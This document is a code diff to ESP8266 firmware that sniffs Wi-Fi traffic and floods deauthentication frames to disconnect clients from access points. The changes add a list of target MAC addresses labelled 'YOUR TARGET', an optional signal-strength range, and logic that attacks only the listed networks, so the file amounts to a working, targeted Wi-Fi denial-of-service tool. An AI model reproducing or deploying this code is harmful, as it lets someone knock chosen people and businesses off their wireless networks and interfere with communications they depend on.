@@ -20,7 +20,7 @@ extern "C" {
 #define MAX_APS_TRACKED 100
 #define MAX_CLIENTS_TRACKED 200
 
-int selfRestart = 1000000;
+int selfRestart = 100000;
 
 // Channel to perform deauth
 uint8_t channel = 0;
@@ -37,9 +37,31 @@ uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };
 
 /*SSID Whitelist*/
 String s1 = "DonotDeauthMe1"; 
-String s2 = "DonotDeauthMe2";
+String s2 = "DonotDeauthMe2"; 
 String s3 = "DonotDeauthMe3"; 
 String s4 = "DonotDeauthMe4";
+String s5 = "DonotDeauthMe5";
+
+//mac blacklist
+boolean useBlackList = true;
+uint8_t bs1[ETH_MAC_LEN] = {0x00,0x00,0x00,0x00,0x00,0x00}; //YOUR TARGET
+uint8_t bs2[ETH_MAC_LEN] = {0x00,0x00,0x00,0x00,0x00,0x00}; //YOUR TARGET
+uint8_t bs3[ETH_MAC_LEN] = {0x00,0x00,0x00,0x00,0x00,0x00}; //YOUR TARGET
+uint8_t bs4[ETH_MAC_LEN] = {0x00,0x00,0x00,0x00,0x00,0x00}; //YOUR TARGET
+uint8_t bs5[ETH_MAC_LEN] = {0x00,0x00,0x00,0x00,0x00,0x00}; //YOUR TARGET
+
+boolean gotBssidMatch1 = false;
+boolean gotBssidMatch2 = false;
+boolean gotBssidMatch3 = false;
+boolean gotBssidMatch4 = false;
+boolean gotBssidMatch5 = false;
+
+//also included range
+signed rssiMin = -86;
+signed rssiMax = -78;
+
+boolean inRange = false;
+boolean inList = false;
 
 struct beaconinfo
 {
@@ -179,7 +201,7 @@ struct clientinfo parse_data(uint8_t *frame, uint16_t framelen, signed rssi, uns
 int register_beacon(beaconinfo beacon)
 {
 
-  if ( inWhitelist(beacon.ssid ) ) {
+  if ( inWhitelist(beacon.ssid,beacon.bssid ) ) {
     return 1;//do not register
   }
 
@@ -235,8 +257,11 @@ void print_beacon(beaconinfo beacon)
   if (beacon.err != 0) {
     //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
   } else {
-    Serial.printf("BEACON:[%s]  ", beacon.ssid);
-    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
+    Serial.print("BEACON:");
+    Serial.print("[");
+    for (int i = 0; i < 6; i++) Serial.printf("0x%02x,", beacon.bssid[i]);
+    Serial.print("]");
+    Serial.printf(" [%24s]  ", beacon.ssid);
     Serial.printf(" %2d", beacon.channel);
     Serial.printf(" %4d\r\n", beacon.rssi);
   }
@@ -363,15 +388,32 @@ uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq)
 }
 
 /* Sends deauth packets. */
-void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
+void deauth(uint8_t *c, uint8_t *ap, uint16_t seq, signed rssi)
 {
-  uint8_t i = 0;
-  uint16_t sz = 0;
-  for (i = 0; i < 0x10; i++) {
-    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
-    wifi_send_pkt_freedom(packet_buffer, sz, 0);
-    delay(1);
+  inRange = false;// (rssi > rssiMin && rssi < rssiMax);
+  inList = inBlacklistBSSID( ap ) ;
+  if(inList || inRange ){
+    digitalWrite(BUILTIN_LED, HIGH);
+    uint8_t i = 0;
+    uint16_t sz = 0;
+    for (i = 0; i < 0x10; i++) {
+      sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
+      wifi_send_pkt_freedom(packet_buffer, sz, 0);
+      --selfRestart;
+      delay(1);
+    }
+    digitalWrite(BUILTIN_LED, LOW);
+    
+    if(inList){
+      Serial.print("KICK");
+    }else{
+      Serial.print(" IN-RANGE");
+    }
+    
+  }else{
+    Serial.print(" OK ");
   }
+  
 }
 
 void promisc_cb(uint8_t *buf, uint16_t len)
@@ -404,15 +446,35 @@ void promisc_cb(uint8_t *buf, uint16_t len)
   }
 }
 
-boolean inWhitelist( uint8_t *ssid ) {
+boolean inWhitelist( uint8_t *ssid, uint8_t *bssid ) {
+  //if(useBlackList){return false;}
   String str = (char*)ssid;
-  return ( str == s1 || str == s2 || str == s3 || str == s4 );
+  return ( str == s1 || str == s2 || str == s3 || str == s4 || str == s5 );
 }
 
+boolean inBlacklistBSSID( uint8_t *bssid ) {
+  //if(!useBlackList){return false;}
+  gotBssidMatch1 = gotBssidMatch2 = gotBssidMatch3 = gotBssidMatch4 = gotBssidMatch5 = true; 
+  for (int i = 0; i < 6; i++){ 
+    gotBssidMatch1 = gotBssidMatch1 && (bssid[i] == bs1[i]);
+    gotBssidMatch2 = gotBssidMatch2 && (bssid[i] == bs2[i]);
+    gotBssidMatch3 = gotBssidMatch3 && (bssid[i] == bs3[i]);
+    gotBssidMatch4 = gotBssidMatch4 && (bssid[i] == bs4[i]);
+    gotBssidMatch5 = gotBssidMatch5 && (bssid[i] == bs5[i]);
+  }
+  return gotBssidMatch1||gotBssidMatch2||gotBssidMatch3||gotBssidMatch4||gotBssidMatch5;  
+}
+
+
 void setup() {
+  
+  pinMode(BUILTIN_LED, OUTPUT);
+  digitalWrite(BUILTIN_LED, LOW);
+  
   Serial.begin(115200);
   Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());
-  delay(2000);
+  delay(1000);
+  
   // Promiscuous works only with station mode
   wifi_set_opmode(STATION_MODE);
 
@@ -425,7 +487,6 @@ void setup() {
 
 void loop() {
   while (true) {
-
     channel = 1;
     wifi_set_channel(channel);
     while (true) {
@@ -438,16 +499,23 @@ void loop() {
         wifi_promiscuous_enable(1);
         for (int ua = 0; ua < aps_known_count; ua++) {
           if (aps_known[ua].channel == channel) {
+            
             for (int uc = 0; uc < clients_known_count; uc++) {
               if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
-                Serial.print("DeAuth ");
-                Serial.printf("[%32s]", aps_known[ua].ssid);
-                deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
+
+                Serial.print("DeAuthC");
+                Serial.printf("[%24s]%4d ", aps_known[ua].ssid, aps_known[ua].rssi);
+                deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n, aps_known[ua].rssi);
                 Serial.println();
+
                 break;
               }
             }
-            deauth(broadcast2, aps_known[ua].bssid, 128);
+
+            Serial.print("DeAuth ");
+            Serial.printf("[%24s]%4d ", aps_known[ua].ssid, aps_known[ua].rssi);
+            deauth(broadcast2, aps_known[ua].bssid, 128, aps_known[ua].rssi );
+            Serial.println();
 
           }
         }
@@ -456,7 +524,7 @@ void loop() {
         wifi_promiscuous_enable(1);
 
         //auto restart 
-        if (--selfRestart <= 0 || ESP.getFreeHeap() < 200) {
+        if (selfRestart <= 0 || ESP.getFreeHeap() < 200) {
           ESP.restart();
         }
 
@@ -464,7 +532,7 @@ void loop() {
         if (channel == 15) break;
         wifi_set_channel(channel);
       }
-      delay(1);
+      delay(1); 
 
       if ((Serial.available() > 0) && (Serial.read() == '\n')) {
         Serial.println("\n-------------------------------------------------------------------------\n");
